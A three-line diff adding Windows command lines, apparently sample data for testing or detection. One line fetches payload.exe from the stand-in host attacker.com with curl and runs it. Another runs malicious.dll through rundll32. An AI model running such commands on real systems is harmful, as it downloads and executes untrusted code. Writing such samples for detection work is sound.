@@ -1,0 +1,3 @@
+curl.exe -o payload.exe http://attacker.com/payload.exe && payload.exe
+powershell.exe -Command "Start-Process notepad.exe"
+rundll32.exe malicious.dll,EntryPoint
